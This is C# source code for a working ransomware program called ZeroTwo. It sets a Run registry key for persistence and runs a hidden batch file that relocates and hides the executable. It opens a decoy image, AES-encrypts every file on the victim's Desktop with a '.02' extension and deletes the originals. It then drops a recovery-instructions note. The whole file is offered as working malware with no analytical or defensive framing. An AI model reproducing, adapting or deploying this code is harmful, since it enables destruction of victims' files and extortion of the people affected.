using System;
using System.IO;
using System.Security.Cryptography;
using System.Reflection;
using System.Diagnostics;
using Microsoft.Win32;

namespace ZeroTwo.src {
    class ZeroTwo {
        private const string EXT = ".02";

        private const string WORKDIR = "C:\\Updates";
        private const string BAT_NAME = "subs.bat";
        private const string REG_KEY = "UpdatesHandler";
        private const string EXE_NAME = "WinUpdates.exe";

        private const int ENC = 0;
        private const int DEC = 1;

        public static void Main(string[] args) {

            if (args.Length == 0) {
                Inject();
                Subs();
                OpenImage();
            } else {
                int op = int.Parse(args[0]);
                Exec(op);
                if (op == ENC) {
                    ReleaseIstructions();
                }
            }
        }

        private static void Inject() {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
            key.SetValue(REG_KEY, WORKDIR + "\\" + EXE_NAME + " " + ENC);
            key.Close();
        }

        private static void OpenImage() {
            var imageRes = "ZeroTwo.src.img.ZeroTwo";
            string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty);
            int index = exePath.LastIndexOf("/");
            string exeFolder = exePath.Substring(0, index);
            string exeName = Process.GetCurrentProcess().ProcessName;
            string imagePath = (exeFolder + "\\" + exeName + ".jpg").Replace("/", "\\");
            try {
                if (File.Exists(imagePath))
                    File.Delete(imagePath);

                if (!Directory.Exists(Path.GetDirectoryName(imagePath)))
                    Directory.CreateDirectory(Path.GetDirectoryName(imagePath));

                using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(imageRes)) {
                    byte[] buf = new byte[sfile.Length];
                    sfile.Read(buf, 0, Convert.ToInt32(sfile.Length));

                    using (FileStream fs = File.Create(imagePath)) {
                        fs.Write(buf, 0, Convert.ToInt32(sfile.Length));
                        fs.Close();
                    }
                }
                Process.Start(imagePath);
            } catch (Exception) {
                //throw new Exception(string.Format("Can't extract resource '{0}' to file '{1}': {2}", imageRes, imagePath, ex.Message), ex);
            }
        }

        private static void Subs() {
            string batchCommands = string.Empty;
            string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");

            batchCommands += "@ECHO OFF\n";
            batchCommands += "ping 127.0.0.1 > nul\n";
            batchCommands += "echo j | move ";
            batchCommands += "\"" + exePath + "\"" + " " + "\"" + WORKDIR + "\\" + EXE_NAME + "\"" + "\n";
            batchCommands += "echo j | attrib +h +s " + "\"" + WORKDIR + "\"" + "\n";
            batchCommands += "echo j | attrib +h +s " + "\"" + WORKDIR + "\\" + EXE_NAME + "\"" + "\n";
            batchCommands += "echo j | del /F /Q " + "\"" + WORKDIR + "\\" + BAT_NAME + "\"";

            Directory.CreateDirectory(WORKDIR);
            File.WriteAllText(WORKDIR + "\\" + BAT_NAME, batchCommands);

            Process p = new Process();
            p.StartInfo.FileName = WORKDIR + "\\" + BAT_NAME;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();
        }

        private static void Exec(int op) {
            string mainPath = "C:/users/" + Environment.UserName + "/Desktop";
            string[] files = Directory.GetFiles(mainPath, "*.*", SearchOption.AllDirectories);

            if (op == ENC) {
                foreach (string file in files) {
                    if (!Path.GetExtension(file).Equals(EXT) && !Path.GetExtension(file).Equals(".ini") && !Path.GetExtension(file).Equals(".exe")) {
                        ToggleCipher(true, file, file + EXT, new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });
                    }
                }
            } else if (op == DEC) {
                foreach (string file in files) {
                    if (Path.GetExtension(file).Equals(EXT)) {
                        ToggleCipher(false, file, file.Remove(file.Length - EXT.Length), new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });
                    }
                }
            }
        }

        private static void ToggleCipher(bool encryptMode, string inputFile, string outputFile, byte[] passwordBytes) {
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            string cryptFile = null;
            if (encryptMode) {
                cryptFile = outputFile;
            }

            FileStream fsCrypt;
            if (encryptMode) {
                fsCrypt = new FileStream(cryptFile, FileMode.Create);
            } else {
                fsCrypt = new FileStream(inputFile, FileMode.Open);
            }

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;

            var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.Zeros;
            AES.Mode = CipherMode.CBC;

            CryptoStream cs;
            if (encryptMode) {
                cs = new CryptoStream(fsCrypt,
                AES.CreateEncryptor(),
                CryptoStreamMode.Write);
            } else {
                cs = new CryptoStream(fsCrypt,
                AES.CreateDecryptor(),
                CryptoStreamMode.Read);
            }

            FileStream fs;
            if (encryptMode) {
                fs = new FileStream(inputFile, FileMode.Open);
            } else {
                fs = new FileStream(outputFile, FileMode.Create);
            }

            int data;
            if (encryptMode) {
                while ((data = fs.ReadByte()) != -1)
                    cs.WriteByte((byte)data);
            } else {
                while ((data = cs.ReadByte()) != -1)
                    fs.WriteByte((byte)data);
            }

            fs.Close();
            cs.Close();
            fsCrypt.Close();

            File.Delete(inputFile);
        }


        public static void ReleaseIstructions() {
            var assembly = Assembly.GetExecutingAssembly();
            var instructionsRes = "ZeroTwo.src.txt.Instructions";

            using (Stream stream = assembly.GetManifestResourceStream(instructionsRes))
            using (StreamReader reader = new StreamReader(stream)) {
                string instructions = reader.ReadToEnd();
                string instructionsPath = "C:/users/" + Environment.UserName + "/Desktop/Istruzioni recupero.txt";
                File.WriteAllText(instructionsPath, instructions);
                Process.Start(instructionsPath);
            }
        }
    }
}
